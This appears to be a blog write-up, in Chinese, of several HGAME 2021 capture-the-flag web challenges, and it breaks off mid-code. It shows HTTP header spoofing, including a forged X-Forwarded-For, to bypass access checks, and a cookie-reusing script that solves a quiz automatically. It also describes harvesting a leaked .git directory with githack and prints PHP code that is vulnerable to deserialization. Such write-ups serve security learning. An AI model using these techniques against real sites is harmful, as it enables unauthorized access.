{"title":"HGAME2021部分","uid":"c9ebdc7b707001d9ef85b7974ab1c1e5","slug":"HGAME2021","date":"2021-01-31T13:25:26.000Z","updated":"2021-03-29T08:46:31.000Z","comments":true,"path":"api/articles/HGAME2021.json","keywords":"A1andNS","cover":null,"content":"<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"Hitchhiking-in-the-Galaxy\"><a href=\"#Hitchhiking-in-the-Galaxy\" class=\"headerlink\" title=\"Hitchhiking_in_the_Galaxy\"></a>Hitchhiking_in_the_Galaxy</h3><p>考点：HTTP头部信息</p>\n<p>访问HitchhikerGuide.php，修改访问模式为POST，修改UA为Infinite Improbability Drive，修改Referer为<a href=\"https://cardinal.ink/%EF%BC%8C%E5%86%8D%E8%AE%BE%E7%BD%AExxf%E4%B8%BA127.0.0.1\">https://cardinal.ink/，再设置xxf为127.0.0.1</a></p>\n<p>​    hgame{s3Cret_0f_HitCHhiking_in_the_GAl@xy_i5_dOnT_p@nic!}</p>\n<h3 id=\"智商检测鸡\"><a href=\"#智商检测鸡\" class=\"headerlink\" title=\"智商检测鸡\"></a>智商检测鸡</h3><p>考点：脚本编写</p>\n<p>首先查看js脚本，发现几个路由的存在/api/getQuestion，/api/verify，/api/getFlag，/api/status</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">getStatus</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    $<span class=\"token punctuation\">.</span><span class=\"token function\">ajax</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>\n        type<span class=\"token operator\">:</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span>\n        url<span class=\"token operator\">:</span> <span class=\"token string\">\"/api/getStatus\"</span><span class=\"token punctuation\">,</span>\n        dataType<span class=\"token operator\">:</span><span class=\"token string\">\"json\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function-variable function\">success</span><span class=\"token operator\">:</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">let</span> solving <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token string\">'solving'</span><span class=\"token punctuation\">]</span>\n            <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#status\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span>solving<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>solving <span class=\"token operator\">===</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">getQuestion</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    $<span class=\"token punctuation\">.</span><span class=\"token function\">ajax</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>\n        type<span class=\"token operator\">:</span> <span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span>\n        url<span class=\"token operator\">:</span> <span class=\"token string\">\"/api/getQuestion\"</span><span class=\"token punctuation\">,</span>\n        dataType<span class=\"token operator\">:</span> <span class=\"token string\">\"json\"</span><span class=\"token punctuation\">,</span>\n        xhrFields<span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span>\n            withCredentials<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n        crossDomain<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function-variable function\">success</span><span class=\"token operator\">:</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#integral'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">html</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token string\">'question'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    $<span class=\"token punctuation\">.</span><span class=\"token function\">ajax</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>\n        type<span class=\"token operator\">:</span> <span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span>\n        url<span class=\"token operator\">:</span> <span class=\"token string\">\"/api/getFlag\"</span><span class=\"token punctuation\">,</span>\n        dataType<span class=\"token operator\">:</span> <span class=\"token string\">\"json\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function-variable function\">success</span><span class=\"token operator\">:</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">html</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">getQuestion</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">getStatus</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">submit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    $<span class=\"token punctuation\">.</span><span class=\"token function\">ajax</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>\n    type<span class=\"token operator\">:</span> <span class=\"token string\">\"POST\"</span><span class=\"token punctuation\">,</span>\n    url<span class=\"token operator\">:</span> <span class=\"token string\">\"/api/verify\"</span><span class=\"token punctuation\">,</span>\n    data<span class=\"token operator\">:</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>answer<span class=\"token operator\">:</span><span class=\"token function\">parseFloat</span><span class=\"token punctuation\">(</span><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#answer'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">val</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    dataType<span class=\"token operator\">:</span> <span class=\"token string\">\"json\"</span><span class=\"token punctuation\">,</span>\n    contentType<span class=\"token operator\">:</span> <span class=\"token string\">\"application/json;charset=utf-8\"</span><span class=\"token punctuation\">,</span>\n    xhrFields<span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span>\n        withCredentials<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n    crossDomain<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function-variable function\">success</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token string\">'result'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#alert'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">html</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">\n                &lt;div class=\"alert alert-success\">\\n\n                    &lt;strong>Right!&lt;/strong>\\n\n                &lt;/div></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#alert'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">html</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">\n                &lt;div class=\"alert alert-danger\">\\n\n                    &lt;strong>Wrong!&lt;/strong>\\n\n                &lt;/div></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>寻找网页规律，发现cookie是没过一关就会更新，自己写了一个来拿flag脚本：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> bs4 <span class=\"token keyword\">import</span> BeautifulSoup\n<span class=\"token keyword\">from</span> sympy <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nCookie <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'session'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'eyJzb2x2aW5nIjoyfQ.YBbSaQ.ju02TXjL-IyCNrnBDQE_4pLZsQA'</span><span class=\"token punctuation\">&#125;</span> <span class=\"token comment\"># 这里是第一次的cookie</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">fun</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> a <span class=\"token operator\">*</span> x <span class=\"token operator\">+</span> b\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">math</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> low<span class=\"token punctuation\">,</span> up<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    x <span class=\"token operator\">=</span> symbols<span class=\"token punctuation\">(</span><span class=\"token string\">\"x\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> integrate<span class=\"token punctuation\">(</span>fun<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> low<span class=\"token punctuation\">,</span> up<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_html</span><span class=\"token punctuation\">(</span>Cookie<span class=\"token operator\">=</span>Cookie<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://r4u.top:5000/api/getQuestion\"</span>\n    r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span>Cookie<span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>encoding <span class=\"token operator\">=</span> <span class=\"token string\">\"utf-8\"</span>\n    <span class=\"token comment\"># print(r.text)</span>\n    <span class=\"token keyword\">return</span> r<span class=\"token punctuation\">.</span>text\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">find_head</span><span class=\"token punctuation\">(</span>soup<span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    msubsup <span class=\"token operator\">=</span> soup<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token string\">'msubsup'</span><span class=\"token punctuation\">)</span>\n    mrows <span class=\"token operator\">=</span> msubsup<span class=\"token punctuation\">.</span>find_all<span class=\"token punctuation\">(</span><span class=\"token string\">\"mrow\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># print(mrows)</span>\n    mo <span class=\"token operator\">=</span> mrows<span class=\"token punctuation\">[</span>num<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token string\">\"mo\"</span><span class=\"token punctuation\">)</span>\n    mn <span class=\"token operator\">=</span> mrows<span class=\"token punctuation\">[</span>num<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token string\">\"mn\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> mo<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>mn<span class=\"token punctuation\">.</span>string<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>mn<span class=\"token punctuation\">.</span>string<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">find_ab</span><span class=\"token punctuation\">(</span>soup<span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    mrows <span class=\"token operator\">=</span> soup<span class=\"token punctuation\">.</span>find_all<span class=\"token punctuation\">(</span><span class=\"token string\">\"mrow\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># print(mrows[0])</span>\n    mns <span class=\"token operator\">=</span> mrows<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>find_all<span class=\"token punctuation\">(</span><span class=\"token string\">\"mn\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># print(mns[num].string)</span>\n    mn <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>mns<span class=\"token punctuation\">[</span>num<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>string<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> mn\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">submit_answer</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">,</span> Cookie<span class=\"token operator\">=</span>Cookie<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    submit_url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://r4u.top:5000/api/verify\"</span>\n    json <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"answer\"</span><span class=\"token punctuation\">:</span> result<span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        ra <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>submit_url<span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span>Cookie<span class=\"token punctuation\">,</span> json<span class=\"token operator\">=</span>json<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ra<span class=\"token punctuation\">.</span>status_code<span class=\"token punctuation\">)</span>\n        ra<span class=\"token punctuation\">.</span>encoding <span class=\"token operator\">=</span> <span class=\"token string\">\"utf-8\"</span>\n        ra<span class=\"token punctuation\">.</span>raise_for_status<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        ls <span class=\"token operator\">=</span> ra<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'Set-Cookie'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\";\"</span><span class=\"token punctuation\">)</span>\n        value <span class=\"token operator\">=</span> ls<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"=\"</span><span class=\"token punctuation\">)</span>\n        Cookie<span class=\"token punctuation\">[</span><span class=\"token string\">'session'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>Cookie<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"访问错误\"</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_flag</span><span class=\"token punctuation\">(</span>Cookie<span class=\"token operator\">=</span>Cookie<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://r4u.top:5000/api/getFlag\"</span>\n    r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span>Cookie<span class=\"token punctuation\">)</span>\n    r<span class=\"token punctuation\">.</span>encoding <span class=\"token operator\">=</span> <span class=\"token string\">\"utf-8\"</span>\n    <span class=\"token comment\"># print(r.text)</span>\n    <span class=\"token keyword\">return</span> r<span class=\"token punctuation\">.</span>text\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">99</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        html <span class=\"token operator\">=</span> get_html<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        soup <span class=\"token operator\">=</span> BeautifulSoup<span class=\"token punctuation\">(</span>html<span class=\"token punctuation\">,</span> <span class=\"token string\">\"html.parser\"</span><span class=\"token punctuation\">)</span>\n        low <span class=\"token operator\">=</span> find_head<span class=\"token punctuation\">(</span>soup<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        up <span class=\"token operator\">=</span> find_head<span class=\"token punctuation\">(</span>soup<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># print(low,up)</span>\n        b <span class=\"token operator\">=</span> find_ab<span class=\"token punctuation\">(</span>soup<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n        a <span class=\"token operator\">=</span> find_ab<span class=\"token punctuation\">(</span>soup<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span>\n        result <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> low<span class=\"token punctuation\">,</span> up<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        result <span class=\"token operator\">=</span> <span class=\"token string\">'&#123;:.2f&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        submit_answer<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>get_flag<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>hgame{3very0ne_H4tes_Math}</p>\n<h3 id=\"watermelon\"><a href=\"#watermelon\" class=\"headerlink\" title=\"watermelon\"></a>watermelon</h3><p>考点：代码审计</p>\n<p>合成大西瓜，nonono，我可不擅长这个游戏，看看网站结构：</p>\n<p>关键应该就在于这个project.js的文件，进入查看源码，搜索alert，一般都是过关弹出flag，成功定位到了window.atob()，这是一个用来解base64的方法，那么就base64解一下里面的内容就可以得到flag</p>\n<p>hgame{do_you_know_cocos_game?}</p>\n<h2 id=\"Arknights\"><a href=\"#Arknights\" class=\"headerlink\" title=\"Arknights\"></a>Arknights</h2><p>考点：git泄露、PHP反序列化</p>\n<p>首先根据提示使用githack抓取git目录，对git泄露的源码进行代码审计。</p>\n<p>simulator.php:</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Simulator</span><span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$session</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$cardsPool</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">session</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Session</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_key_exists</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"session\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">session</span><span class=\"token operator\">-></span><span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"session\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cardsPool</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">CardsPool</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"./pool.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cardsPool</span><span class=\"token operator\">-></span><span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">draw</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$count</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token variable\">$count</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$card</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cardsPool</span><span class=\"token operator\">-></span><span class=\"token function\">draw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$card</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"stars\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">session</span><span class=\"token operator\">-></span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$card</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"No\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n\n            <span class=\"token variable\">$result</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$card</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">session</span><span class=\"token operator\">-></span><span class=\"token function\">save</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">getLegendary</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token 